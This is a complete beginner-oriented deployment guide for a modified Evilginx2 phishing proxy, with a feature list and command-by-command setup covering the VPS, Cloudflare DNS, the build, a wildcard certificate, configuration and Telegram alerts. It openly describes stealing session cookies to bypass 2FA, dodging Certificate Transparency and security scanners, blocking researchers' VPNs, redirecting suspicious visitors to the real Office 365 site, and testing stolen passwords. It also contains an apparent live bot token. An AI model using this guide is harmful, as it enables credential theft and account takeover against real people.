# Evilginx2 (Telegram Edition by @officialmonsterz) — Complete Deployment Guide

**The full, no-stone-unturned guide from zero to fully functional**

---

## WHAT YOU'RE ABOUT TO BUILD

This guide will take you from a fresh VPS to a fully operational Evilginx2 server with **every single feature** working:

| Feature | What It Means In Plain English |
|---------|-------------------------------|
| **Reverse Proxy Engine** | Acts as a middleman between the victim and the real website |
| **Session Cookie Capture** | Steals the "already logged in" ticket — bypasses 2FA completely |
| **Wildcard SSL Certificate** | One certificate covers `*.yourdomain.com` — stays hidden from Certificate Transparency logs |
| **Web Dashboard** | A website at port 5000 where you see all captured sessions in a table |
| **Telegram Alerts** | Your phone buzzes the instant credentials are captured |
| **GeoIP Tracking** | Shows you country, city, latitude/longitude, ISP, and VPN status of every visitor |
| **Credential Validation** | Automatically tests if the stolen password actually works on the real website |
| **VPN/Proxy/DC Blocking** | Block visitors who are using VPNs, proxies, or datacenter IPs |
| **Country Blocking** | Block entire countries from seeing your phishing page |
| **Cloudflare Turnstile** | A CAPTCHA challenge before victims see the login page |
| **CSS Randomization** | Changes tiny pixels every page load — defeats screenshot-based detection |
| **Privacy Extension Detection** | Detects if the victim has ad-blockers or anti-phishing extensions |
| **Header Stripping** | Removes Evilginx fingerprints so security scanners can't detect it |
| **JS Obfuscation** | Hides injected JavaScript so signature-based detection fails |
| **URL Rewriting** | Cleans the browser address bar so victims don't see suspicious paths |
| **Dynamic Content Spoofing** | Serves real-looking content to unauthorized visitors instead of a blank page |
| **Auto-Start on Boot** | If your VPS reboots, Evilginx starts automatically |
| **Blacklist System** | Blocks repeat visitors and automated scanners |
| **Live Feed (optional)** | Real-time WebSocket feed of events as they happen |
| **Auto-Export** | Automatically saves sessions to CSV or JSON |

---

## WHAT YOU NEED BEFORE STARTING

| Item | Example | Where To Get It |
|------|---------|-----------------|
| **VPS (Virtual Private Server)** | `95.133.228.19` | Hetzner, DigitalOcean, Vultr, Contabo, Linode — any Ubuntu 22.04 or 24.04 |
| **Domain Name** | `officialmonsterz.store` | Namecheap, GoDaddy, Porkbun, Cloudflare Registrar |
| **Cloudflare Account** | Free plan | https://dash.cloudflare.com |
| **Telegram Account** | @yourusername | https://telegram.org |
| **SSH Client** | Terminal or PuTTY | Built into Mac/Linux. Windows: https://putty.org or Windows Terminal |

**VPS minimum specs:** 1 CPU core, 1 GB RAM, 10 GB SSD, Ubuntu 22.04 or 24.04.

**Total time:** 45–75 minutes depending on your internet speed.

---

# PART 1: CONNECTING TO YOUR VPS

## STEP 1 — Open Your Terminal

First, you need to connect to your VPS. This is called SSH (Secure Shell).

**On Mac or Linux:**
- Open the "Terminal" app
- You'll see a window with a blinking cursor

**On Windows:**
- Open "Command Prompt" or "PowerShell" or install "Windows Terminal"

## STEP 2 — SSH Into Your VPS

Type this command exactly, replacing `95.133.228.19` with YOUR actual VPS IP address:

```bash
ssh root@95.133.228.19
```

Then press **Enter**.

**What this does:** It opens a secure connection to your server.

**What you'll see:**
```
The authenticity of host '95.133.228.19 (95.133.228.19)' can't be established.
ED25519 key fingerprint is SHA256:...
Are you sure you want to continue connecting? (yes/no/[fingerprint])
```

Type `yes` and press **Enter**.

Then it asks for your password. **Type your VPS root password** and press **Enter**.

⚠️ **Important:** When you type the password, you won't see any characters on screen (no dots, no asterisks). This is normal. Just type and press Enter.

**What you'll see if successful:**
```
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-rc7 x86_64)

root@yourvps:~#
```

The `root@yourvps:~#` prompt means you're now inside your VPS.

### TROUBLESHOOTING SSH

| Problem | What's Happening | How To Fix |
|---------|------------------|------------|
| `Connection refused` | SSH service not running or wrong port | Go to your VPS provider's panel → reinstall with Ubuntu → try again |
| `Permission denied` | Wrong password | Go to VPS provider panel → reset root password → try again |
| `Connection timed out` | VPS IP is wrong or server is off | Check the IP in your VPS provider's dashboard |
| `Host key changed` | You've connected to this IP before with a different server | Run this first: `ssh-keygen -R 95.133.228.19` then try again |

---

# PART 2: SYSTEM PREPARATION

## STEP 3 — Update Your System

Think of this like updating apps on your phone — it fixes security issues and gets everything ready.

Run this command:

```bash
apt update && apt upgrade -y
```

**What you'll see:** Lots of text scrolling. Package lists being downloaded. It ends with:
```
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

**What it does:**
- `apt update` — checks for new versions of everything
- `apt upgrade -y` — downloads and installs them (the `-y` means "yes, I agree")

**Takes:** 1–5 minutes depending on your VPS's internet speed.

### TROUBLESHOOTING UPDATE

| Problem | What's Happening | How To Fix |
|---------|------------------|------------|
| `Could not get lock /var/lib/dpkg/lock-frontend` | Another update is already running | Wait 2 minutes, then try again. Or reboot: `reboot` |
| `Waiting for cache lock: Could not get lock` | Same as above | Run: `killall apt apt-get` then try again |
| `Failed to fetch` | Internet issue on VPS | Try again: `apt update` |

## STEP 4 — Install Required Programs

Now we install all the tools we'll need. Each one is like installing an app on your phone.

Run this single command:

```bash
apt install -y curl wget git make build-essential screen fail2ban htop net-tools ufw certbot nano tar unzip dnsutils
```

**What each tool does (in plain English):**
| Tool | What It Does |
|------|--------------|
| `curl` | Downloads things from the internet (like a web browser in the terminal) |
| `wget` | Also downloads things from the internet |
| `git` | Downloads code from GitHub |
| `make` | Helps compile programs |
| `build-essential` | Has tools needed to turn code into a working program |
| `screen` | Lets you leave a program running even after you close your terminal |
| `fail2ban` | Security — blocks hackers who try to guess your password |
| `htop` | Shows you what programs are running and using CPU/memory |
| `net-tools` | Network utilities like `ifconfig` |
| `ufw` | Firewall — blocks unwanted internet traffic |
| `certbot` | Gets free SSL certificates from Let's Encrypt |
| `nano` | A simple text editor in the terminal |
| `tar` | Extracts compressed files |
| `unzip` | Extracts zip files |
| `dnsutils` | DNS tools like `dig` for checking DNS records |

**What you'll see:** Each package installs one by one. Final line will show something like:
```
Processing triggers for man-db (2.10.2-1) ...
```

**Takes:** 30–60 seconds.

## STEP 5 — Configure the Firewall (UFW)

The firewall is like a bouncer at a club — it only lets specific types of traffic in.

We need to open exactly these doors (ports):

| Port | Protocol | What Uses It |
|------|----------|--------------|
| 22 | TCP | SSH (you connecting to the VPS) |
| 53 | UDP | DNS (Evilginx's built-in DNS server) |
| 80 | TCP | HTTP (redirects visitors to HTTPS) |
| 443 | TCP | HTTPS (the phishing pages) |
| 5000 | TCP | Web Dashboard (the browser interface) |

Run these commands one at a time:

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
```

**What each command says:** "Bouncer, let this type of traffic through."

Now turn the firewall ON and check it:

```bash
ufw --force enable
ufw status numbered
```

**What you'll see:**
```
Status: active

     To                         Action      From
--                         ------      ----
22/tcp                     ALLOW       Anywhere
53/udp                     ALLOW       Anywhere
80/tcp                     ALLOW       Anywhere
443/tcp                    ALLOW       Anywhere
5000/tcp                   ALLOW       Anywhere
```

✅ **All 5 ports must show "ALLOW" and "Anywhere"**

**What `ufw --force enable` does:** Turns the firewall on without asking "are you sure?".

### TROUBLESHOOTING FIREWALL

| Problem | How To Fix |
|---------|------------|
| `ufw: command not found` | Re-run Step 4 (packages didn't install) |
| A port is missing | Run `ufw allow <port>/<protocol>` |
| Need to delete a wrong rule | `ufw status numbered` → `ufw delete <NUMBER>` |
| Can't SSH after enabling | This shouldn't happen since we allowed 22 first, but your VPS provider might have its own firewall too — check their control panel |

---

# PART 3: FREE UP PORT 53 (DNS)

## STEP 6 — Kill Ubuntu's DNS Resolver

Port 53 is the door that DNS uses. Ubuntu has a built-in DNS service called `systemd-resolved` that sits on this door. Evilginx needs this door for its own DNS server. Think of it as someone sitting in your parking spot — you need to move them.

Run these commands **one at a time**:

```bash
# Step 6a: Stop the built-in DNS resolver
systemctl stop systemd-resolved
```

✅ **What you'll see:** Nothing. Just returns to the prompt.

```bash
# Step 6b: Prevent it from starting on boot
systemctl disable systemd-resolved
```

✅ **What you'll see:**
```
Removed /etc/systemd/system/sysinit.target.wants/systemd-resolved.service.
```

```bash
# Step 6c: Remove the old DNS config file
rm -f /etc/resolv.conf
```

✅ **What you'll see:** Nothing.

```bash
# Step 6d: Set Cloudflare's DNS as our new DNS server
echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
```

✅ **What you'll see:**
```
nameserver 1.1.1.1
```

```bash
# Step 6e: Add a backup DNS server
echo "nameserver 1.0.0.1" | tee -a /etc/resolv.conf
```

✅ **What you'll see:**
```
nameserver 1.0.0.1
```

```bash
# Step 6f: Lock the file so nothing overwrites it
chattr +i /etc/resolv.conf
```

✅ **What you'll see:** Nothing.

### What You Just Did (Plain English):

| Command | What It Actually Did |
|---------|---------------------|
| `systemctl stop` | Told Ubuntu's DNS service to go to sleep |
| `systemctl disable` | Told Ubuntu's DNS service "don't wake up on boot" |
| `rm -f /etc/resolv.conf` | Deleted the old "phone book" that tells your VPS how to find websites |
| `echo ... > /etc/resolv.conf` | Wrote Cloudflare's DNS (1.1.1.1) as the new "phone book" |
| `chattr +i` | Locked the file so nothing can change it (like putting a padlock on it) |

## STEP 7 — Test DNS Is Working

Now check that your VPS can still look up websites:

```bash
dig @1.1.1.1 google.com +short
```

✅ **What you'll see:** An IP address like:
```
142.250.80.46
```

**If you see nothing (blank line):** Wait 5 seconds and try again.

**If you see `dig: command not found`:** Run `apt install dnsutils -y` first.

## STEP 8 — Reboot for Clean State

This gives your VPS a fresh start with port 53 free:

```bash
reboot
```

**What you'll see:**
```
Connection to 95.133.228.19 closed by remote host.
Connection to 95.133.228.19 closed.
```

**Wait 20–30 seconds.** Then reconnect:

```bash
ssh root@95.133.228.19
```

Type your password when prompted.

---

# PART 4: INSTALL GO (THE PROGRAMMING LANGUAGE)

Evilginx is written in a language called Go. We need to install Go to compile (translate) the code into a working program.

## STEP 9 — Download and Install Go

First, let's find the latest version of Go:

```bash
cd /tmp
GO_VERSION=$(curl -sL 'https://go.dev/VERSION?m=text' | head -1)
echo "Latest Go version: $GO_VERSION"
```

✅ **What you'll see:** Something like:
```
Latest Go version: go1.23.2
```

The exact version may be different. That's fine — we'll download whatever is latest.

Now download it:

```bash
wget "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz"
```

✅ **What you'll see:** A progress bar showing the download:
```
2025-08-25 12:00:00 (5.2 MB/s) - 'go1.23.2.linux-amd64.tar.gz' saved [68149151/68149151]
```

Check if your VPS is 64-bit (which most are):

```bash
uname -m
```

✅ **Should show:** `x86_64`

If it shows `aarch64` or `arm64`, you need the ARM version instead:
```bash
# Only if your VPS is ARM64:
wget "https://go.dev/dl/${GO_VERSION}.linux-arm64.tar.gz"
```

Now remove any old Go installation and extract the new one:

```bash
rm -rf /usr/local/go
tar -C /usr/local -xzf "${GO_VERSION}.linux-amd64.tar.gz"
```

**What this does:** Unpacks Go into `/usr/local/go` (like extracting a zip file to the Programs folder).

Now add Go to your PATH (PATH is the list of folders your terminal searches when you type a command):

```bash
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
```

**What this does:**
- `~/.bashrc` is like a settings file that runs every time you open a terminal
- The command adds Go's folder to the search path
- `source ~/.bashrc` applies the change immediately without closing the terminal

Verify Go is installed:

```bash
go version
```

✅ **What you'll see:**
```
go version go1.23.2 linux/amd64
```

The version number should match what you downloaded.

Clean up the downloaded file (no need to keep it):

```bash
rm "${GO_VERSION}.linux-amd64.tar.gz"
cd ~
```

### TROUBLESHOOTING GO

| Problem | What's Happening | How To Fix |
|---------|------------------|------------|
| `go: command not found` | Go not in PATH | Run `source ~/.bashrc` or reconnect SSH (`exit` then `ssh root@...`) |
| Wrong architecture | You downloaded amd64 but VPS is ARM | Run `uname -m` — if it shows `aarch64`, re-download the ARM64 version |
| `tar: Error is not recoverable` | Corrupted download | Run `rm go*.tar.gz` then re-download |

---

# PART 5: CLOUDFLARE + DNS SETUP (IN YOUR BROWSER)

This is the part you do in a web browser, NOT in the terminal. Open Chrome, Firefox, or Edge on your regular computer.

## STEP 10 — Add Your Domain to Cloudflare

1. Go to **https://dash.cloudflare.com**
2. Log in (create a free account if you don't have one — takes 2 minutes)
3. Click **"Add a Site"** (blue button, top right)
4. Type your domain name exactly: **`officialmonsterz.store`** (or whatever YOUR domain is)
5. Click **"Add"**

6. Cloudflare asks you to choose a plan. Select **"Free"** (it's enough).
7. Click **"Continue"** (it's at the bottom)

8. Cloudflare will scan your existing DNS records. Wait for it to finish.

9. After the scan, Cloudflare shows you **2 nameservers**. These look like:
   - `arya.ns.cloudflare.com`
   - `matt.ns.cloudflare.com`
   
   ⚠️ **YOURS WILL BE DIFFERENT.** Copy them exactly. You need these in the next step.

## STEP 11 — Point Your Domain Registrar to Cloudflare

Your domain is currently registered somewhere — probably Namecheap, GoDaddy, or Porkbun. We need to tell that registrar "use Cloudflare's servers instead."

**For Namecheap (most common):**
1. Go to **https://www.namecheap.com** → Log in
2. Click **"Domain List"** (left sidebar)
3. Click the **"Manage"** button next to your domain
4. Scroll down to **"Nameservers"** section
5. Change the dropdown from **"Namecheap Basic DNS"** to **"Custom DNS"**
6. In the two boxes, paste the **2 Cloudflare nameservers** you copied
7. Click the **green checkmark** to save

**For GoDaddy:**
1. Go to **https://www.godaddy.com** → Log in
2. Click your name → **"My Products"**
3. Next to your domain, click **"DNS"**
4. Scroll to **"Nameservers"** → Click **"Change"**
5. Select **"Custom"** → Type the 2 Cloudflare nameservers
6. Click **"Save"**

**For Cloudflare Registrar (if you bought the domain at Cloudflare):**
- Skip this step — your domain already uses Cloudflare's nameservers.

✅ **Now wait 5–15 minutes** for this to spread across the internet. Go grab a coffee.

**How to check if it worked:**
```bash
# In your VPS terminal:
whois officialmonsterz.store | grep "Name Server"
```

Replace with your domain. Expected:
```
Name Server: arya.ns.cloudflare.com
Name Server: matt.ns.cloudflare.com
```

## STEP 12 — Add DNS Records in Cloudflare

Go back to **Cloudflare** in your browser:
1. Click your domain name (it should now show as **"Active"** with a green checkmark)
2. Click the **"DNS"** tab

Now we add 2 records:

### Add Record 1: Root Domain (@)

| Field | Value |
|-------|-------|
| **Type** | `A` (select from dropdown) |
| **Name** | `@` |
| **IPv4 Address** | Your VPS IP (e.g., `95.133.228.19`) |
| **Proxy Status** | **DNS Only** (grey cloud icon — click it to toggle) |
| **TTL** | Auto |

Click **"Save"**.

### Add Record 2: Wildcard (*)

| Field | Value |
|-------|-------|
| **Type** | `A` |
| **Name** | `*` |
| **IPv4 Address** | Your VPS IP (same as above) |
| **Proxy Status** | **DNS Only** (grey cloud) |
| **TTL** | Auto |

Click **"Save"**.

⚠️ **⚠️ ⚠️ CRITICAL WARNING ⚠️ ⚠️ ⚠️**

The cloud icon MUST be **GREY** (DNS Only), NOT orange (Proxied).

- **Grey cloud = DNS Only** = Traffic goes DIRECTLY to your VPS ✅
- **Orange cloud = Proxied** = Traffic goes through Cloudflare's proxy (breaks Evilginx SSL) ❌

**If you accidentally make it orange, click it again to turn it grey.**

### What These Records Mean:

| Record | What It Does |
|--------|--------------|
| `@` | `officialmonsterz.store` (your bare domain) goes to your VPS |
| `*` | `ANYTHING.officialmonsterz.store` (login, mail, accounts, etc.) also goes to your VPS |

The wildcard (`*`) is what makes `https://login.yourdomain.com`, `https://accounts.yourdomain.com`, etc. all work without adding each one separately.

## STEP 13 — Configure SSL/TLS Settings in Cloudflare

1. Click **"SSL/TLS"** in the left sidebar
2. Click **"Overview"** tab
3. Under **"SSL/TLS encryption mode"**, select **"Full"**
   - **NOT "Off"** — then connections aren't encrypted
   - **NOT "Flexible"** — that's for when your server doesn't have SSL
   - **NOT "Full (strict)"** — that requires matching certificates and can break things
   - ✅ **"Full"** is the sweet spot

4. Click **"Edge Certificates"** tab
5. **"Always Use HTTPS"** → Toggle **ON** (so all HTTP visitors get redirected to HTTPS)
6. **"Automatic HTTPS Rewrites"** → Toggle **ON** (fixes mixed content warnings)

## STEP 14 — Verify DNS from Your VPS

Back in your SSH terminal, test that DNS is working:

```bash
dig @1.1.1.1 officialmonsterz.store +short
dig @1.1.1.1 test.officialmonsterz.store +short
```

Replace `officialmonsterz.store` with YOUR domain.

✅ **Both MUST show your VPS IP:**
```
95.133.228.19
```

If they don't match, wait 2 more minutes and try again. DNS propagation can take time.

**Check with the `+trace` option for deeper debugging:**
```bash
dig @1.1.1.1 officialmonsterz.store +trace +short
```

### TROUBLESHOOTING DNS

| Problem | What's Wrong | How To Fix |
|---------|--------------|------------|
| `@` record returns nothing | Record not added or not propagated | Go to Cloudflare DNS → verify the `@` A record exists |
| Wildcard `*` returns nothing | Same for wildcard | Go to Cloudflare DNS → verify the `*` A record exists |
| Both return wrong IP | You typed the wrong IP in Cloudflare | Delete the records, re-add with correct IP |
| Nameservers still show Namecheap | Propagation not complete | Wait. Run: `whois yourdomain.com \| grep "Name Server"` |
| `dig` shows IP but browser doesn't work | Your local computer's DNS hasn't updated | Clear your browser's DNS cache or use Incognito mode |

---

# PART 6: BUILD EVILGINX FROM SOURCE CODE

## STEP 15 — Clone the Repository

"Cloning" means downloading the code from GitHub to your VPS:

```bash
cd /root
git clone https://github.com/afrikaquality/evilginx2.git
```

✅ **What you'll see:**
```
Cloning into 'evilginx2'...
remote: Enumerating objects: 1234, done.
remote: Counting objects: 100% (1234/1234), done.
remote: Compressing objects: 100% (654/654), done.
Receiving objects: 100% (1234/1234), done.
Resolving deltas: 100% (567/567), done.
```

Enter the project directory:

```bash
cd evilginx2
```

## STEP 16 — Check What's Inside

```bash
ls -la
```

✅ **You should see files like:**
```
-rw-r--r--   1 root root   ... Dockerfile
-rw-r--r--   1 root root   ... README.md
drwxr-xr-x   2 root root   ... core/
drwxr-xr-x   2 root root   ... database/
-rw-r--r--   1 root root   ... go.mod
-rw-r--r--   1 root root   ... go.sum
-rw-r--r--   1 root root   ... main.go
drwxr-xr-x   2 root root   ... phishlets/
drwxr-xr-x   2 root root   ... redirectors/
```

Check the phishlets directory (these are the YAML templates that tell Evilginx how to mimic specific websites):

```bash
ls -la phishlets/
```

✅ **Should show `.yaml` files like:**
```
-rw-r--r-- 1 root root ... microsoft.yaml
-rw-r--r-- 1 root root ... google.yaml
-rw-r--r-- 1 root root ... linkedin.yaml
-rw-r--r-- 1 root root ... office365.yaml
```

**If the phishlets directory is empty**, you need to download phishlets separately:
```bash
# Try getting them from a community repository
cd /root/evilginx2
git clone https://github.com/afrikaquality/evilginx2-phishlets.git temp-phishlets 2>/dev/null
cp temp-phishlets/*.yaml phishlets/ 2>/dev/null
rm -rf temp-phishlets
ls -la phishlets/
```

## STEP 17 — Build the Evilginx Binary

Now we compile the code into a working program. This is the "building" phase:

```bash
# Step 17a: Clean any cached module data (prevents build errors)
rm -rf vendor/ 2>/dev/null
go clean -modcache
```

✅ **What you'll see:** Nothing (or a message about no cached modules).

```bash
# Step 17b: Download all Go dependencies (like installing app dependencies)
go mod tidy
```

✅ **What you'll see:** Nothing if everything is cached, or a bunch of downloading messages if not. Takes 10–30 seconds.

```bash
# Step 17c: Compile the program
go build -mod=mod -o evilginx2 .
```

⚠️ **This takes 30–90 seconds.** You'll see nothing during compilation — the terminal just hangs. That's normal. Wait for it to finish.

```bash
# Step 17d: Make it executable
chmod +x evilginx2
```

```bash
# Step 17e: Check the resulting file
ls -lh evilginx2
```

✅ **What you'll see:**
```
-rwxr-xr-x 1 root root 25M Aug 25 12:00 evilginx2
```

**The file should be approximately 25 MB.** If it's much smaller (like 2 KB), something went wrong.

### TROUBLESHOOTING BUILD

| Problem | What It Means | How To Fix |
|---------|---------------|------------|
| `go: command not found` | Go isn't installed or not in PATH | Run `source ~/.bashrc` or go back to Step 9 |
| `go: go.mod file not found` | You're not in the evilginx2 directory | `cd /root/evilginx2` then try again |
| `go: github.com/... : read tcp ... i/o timeout` | Network timeout downloading dependencies | Try again: `go mod tidy` then `go build` |
| `build fails with missing imports` | Corrupted module cache | `go clean -modcache` then `go mod tidy` then rebuild |
| Binary is only 2 KB | Build failed silently | Check errors above. Run `go build -v -o evilginx2 .` for verbose output |

---

# PART 7: WILDCARD SSL CERTIFICATE

This is the most important and trickiest part. A wildcard certificate covers `*.yourdomain.com` so every subdomain gets HTTPS automatically, AND the subdomains stay hidden from Certificate Transparency logs (crt.sh).

**Without wildcard cert:** Each subdomain gets its own cert and appears publicly on crt.sh
**With wildcard cert:** Only `yourdomain.com` appears in logs — subdomains are invisible

## STEP 18 — Run Certbot

```bash
certbot certonly --manual --preferred-challenges dns -d '*.officialmonsterz.store' -d officialmonsterz.store
```

Replace `officialmonsterz.store` with YOUR domain.

✅ **What you'll see:**
```
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Enter email address (used for urgent renewal and security notices)
 (Enter 'c' to cancel): 
```

## STEP 19 — Answer Certbot's Questions

1. **Email:** Type your email address (e.g., `you@gmail.com`) → Press **Enter**

2. **Agree to Terms:** Type `A` (for Agree) → Press **Enter**
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please read the Terms of Service at
https://letsencrypt.org/documents/LE-SA-v1.4-April-2025.pdf . You must agree
in order to register with the ACME server at
https://acme-v02.api.letsencrypt.org/directory
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(A)gree/(C)ancel: A
```

3. **Share email with EFF:** Type `N` (for No) → Press **Enter** (unless you want spam)
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Would you like to receive emails about EFF and Let's Encrypt?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(Y)es/(N)o: N
```

## STEP 20 — Certbot Shows the DNS Challenge

You'll see something like this:

```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Please deploy a DNS TXT record under the name:

_acme-challenge.officialmonsterz.store

with the following value:

dGVzdC1hY21lLWNoYWxsZW5nZS12YWx1ZS0xMjM0NTY3ODkw

Before continuing, verify the record is deployed.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Press Enter to Continue
```

**⚠️ DO NOT PRESS ENTER YET.** Leave this terminal window open!

## STEP 21 — Add the TXT Record in Cloudflare

1. Open a **new browser tab** (or a new window)
2. Go to Cloudflare → your domain → **DNS** tab
3. Click **"Add Record"**

| Field | Value |
|-------|-------|
| **Type** | `TXT` |
| **Name** | `_acme-challenge` |
| **Value** | Paste the EXACT random string certbot showed you |
| **TTL** | Auto |
| **Proxy status** | DNS Only (grey cloud) |

4. Click **"Save"**

## STEP 22 — Verify the TXT Record Propagated

Open a **second SSH connection** to your VPS (or just run this command in your current terminal, since certbot is paused):

Actually, you can open another terminal window on your computer:

```bash
# Terminal window 2 (new SSH connection)
ssh root@95.133.228.19
dig @1.1.1.1 _acme-challenge.officialmonsterz.store TXT +short
```

✅ **What you'll see:** Your random string in quotes:
```
"dGVzdC1hY21lLWNoYWxsZW5nZS12YWx1ZS0xMjM0NTY3ODkw"
```

**If nothing shows:** Wait 30 seconds and try again. Cloudflare propagation is usually instant.

**If wrong value shows:** You may have typed it wrong. Check and fix in Cloudflare.

## STEP 23 — Complete Certbot

Once `dig` shows the TXT value, go back to the **certbot terminal** (the first one, where certbot is paused) and press **Enter**.

**Wait 5–15 seconds.** Certbot contacts Let's Encrypt to verify.

✅ **Success message:**
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/officialmonsterz.store/privkey.pem
```

### IF CERTBOT FAILS

**What failure looks like:**
```
Failed to receive certificate. There were too many requests of this type...
```

**What to do:**
1. Go to Cloudflare DNS → delete the TXT record you just added
2. Run this to delete the failed attempt:
   ```bash
   certbot delete --cert-name officialmonsterz.store
   ```
3. Start over from Step 18. Certbot will give a NEW random string.
4. Add the NEW TXT record in Cloudflare
5. Verify with `dig`
6. Press Enter

---

# PART 8: SET UP EVILGINX CONFIGURATION

## STEP 24 — Copy Certificate to Evilginx Directory

```bash
# Create the directory where Evilginx expects wildcard certs
mkdir -p /root/.evilginx/crt/wildcard

# Copy the certificate files
cp /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/officialmonsterz.store/privkey.pem /root/.evilginx/crt/wildcard/
```

## STEP 25 — Verify the Certificate

Check the files exist:

```bash
ls -l /root/.evilginx/crt/wildcard/
```

✅ **Expected:**
```
-rw-r--r-- 1 root root 4567 Aug 25 12:00 fullchain.pem
-rw-r--r-- 1 root root 1704 Aug 25 12:00 privkey.pem
```

Check it's actually a wildcard certificate:

```bash
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
```

✅ **Expected:**
```
subject = CN = *.officialmonsterz.store
```

**⚠️ IMPORTANT:** The `*` before the domain is crucial. If it shows just `officialmonsterz.store` without `*.`, the certbot command was wrong (you missed the `-d '*.domain.com'` part). Re-do from Step 18.

Check when the certificate expires:

```bash
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -enddate
```

✅ **Expected:** `notAfter=Nov 23 11:59:59 2025 GMT` (Let's Encrypt certs are valid for 90 days)

Set correct permissions:

```bash
chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
```

**Why these permissions?**
- `644` = Everyone can read the certificate (needed by processes)
- `600` = ONLY root can read the private key (security critical — if stolen, someone could impersonate your site)

## STEP 26 — First Run (Creates Config Files)

We run Evilginx once just to create the configuration directory and files:

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass mypass123
```

✅ **What you'll see:**
```
                    ____  _ _     _           _
                   / __ \(_) |   (_)         | |
                  | |  | |_| |__  _  ___  ___| |__
                  | |  | | | '_ \| |/ _ \/ __| |/ /
                  | |__| | | |_) | |  __/ (__|   <
                   \____/|_|_.__/|_|\___|\___|_|\_\

        Version 3.3.0  by @mrgretzky (Telegram Edition by @officialmonsterz)

[dashboard] web interface starting on http://0.0.0.0:5000
[inf] loading phishlets from: /root/evilginx2/phishlets
[inf] loading configuration from: /root/.evilginx

evilginx>
```

You're now inside the Evilginx interactive shell. The `evilginx>` prompt means Evilginx is listening for your commands.

## STEP 27 — Set Your Domain and IP

At the `evilginx>` prompt, type these **one at a time**, pressing **Enter** after each:

```
config domain officialmonsterz.store
```

✅ **Expected:**
```
[inf] server domain set to: officialmonsterz.store
```

```
config ipv4 external 95.133.228.19
```

✅ **Expected:**
```
[inf] server external IP set to: 95.133.228.19
```

```
config autocert on
```

✅ **Expected:**
```
[inf] autocert is now enabled
```

⚠️ **Note:** We set `autocert on` even though we have a wildcard cert. This is because Evilginx's wildcard support looks for certs in `/root/.evilginx/crt/wildcard/` only when `autocert` is enabled. Don't worry — it will find and use our wildcard cert first.

## STEP 28 — Set Unauthorized Redirect URL

When someone visits your phishing page without a valid lure link, they get sent here. Set it to the real login page so they don't get suspicious:

```
config unauth_url https://www.office365.com
```

✅ **Expected:**
```
[inf] unauthorized request redirection URL set to: https://www.office365.com
```

## STEP 29 — Enable Blacklist Mode

This blocks IP addresses after an unauthorized visit:

```
blacklist unauth
```

✅ **Expected:**
```
[inf] blacklist mode set to: unauth
```

**What `unauth` means:** If someone visits your phishing page without a valid lure link, their IP gets blocked from trying again.

## STEP 30 — Enable Header Stripping

This removes Evilginx fingerprints from HTTP responses so security scanners can't easily detect it:

```
config strip_headers on
```

✅ **Expected:**
```
[inf] header stripping enabled - all Evilginx artifact headers will be removed
```

## STEP 31 — Verify Your Configuration

```
config
```

✅ **Expected:**
```
domain: officialmonsterz.store
external_ipv4: 95.133.228.19
autocert: true
unauth_url: https://www.office365.com
blacklist_mode: unauth
strip_headers: on
```

## STEP 32 — Exit to Save Configuration

```
exit
```

✅ **Expected:** Evilginx stops and you return to the bash prompt.

Verify the configuration was saved:

```bash
cat /root/.evilginx/config.json
```

✅ **Expected:** A JSON file containing your settings:
```json
{
  "general": {
    "domain": "officialmonsterz.store",
    "external_ipv4": "95.133.228.19",
    "autocert": true,
    "unauth_url": "https://www.office365.com",
    "strip_headers": true
  },
  "blacklist": {
    "mode": "unauth"
  }
}
```

---

# PART 9: TELEGRAM INTEGRATION

## STEP 33 — Create a Telegram Bot

1. Open Telegram on your phone or computer
2. Search for **`@BotFather`** (it's verified with a blue checkmark ✅)
3. Start a chat and send: **`/newbot`**
4. BotFather asks: **"Alright, a new bot. How are we going to call it? Please choose a name for your bot."**
   - Type a name like: **`MyAlertBot`**
   - Press **Enter** (or Send)
5. BotFather asks: **"Good. Now let's choose a username for your bot. It must end in 'bot'. Like this, for example: TetrisBot or tetris_bot."**
   - Type a username like: **`my_alert_bot`** (must end in `bot`)
   - Press **Enter** (or Send)

✅ **BotFather replies:**
```
Done! Congratulations on your new bot. You will find it at t.me/my_alert_bot.
You can now add a description, about section and profile picture for your bot.

Use this token to access the HTTP API:
8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo

For a description of the Bot API, see this page: https://core.telegram.org/bots/api
```

**⚠️ COPY THE TOKEN IMMEDIATELY.** It looks like:
```
8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo
```

This is your bot's password. Keep it secret. If someone else gets it, they can control your bot.

## STEP 34 — Test the Bot Token

Back in your VPS terminal, test that the token works:

```bash
curl -s "https://api.telegram.org/bot8863425004:AAF7mZ0poUo6dal8-8FgUNgRkIhkPlylAvo/getMe"
```

Replace the token with YOUR actual token.

✅ **Expected:**
```json
{"ok":true,"result":{"id":8863425004,"is_bot":true,"first_name":"MyAlertBot","username":"my_alert_bot","can_join_groups":true,"can_read_all_group_messages":false,"supports_inline_queries":false}}
```

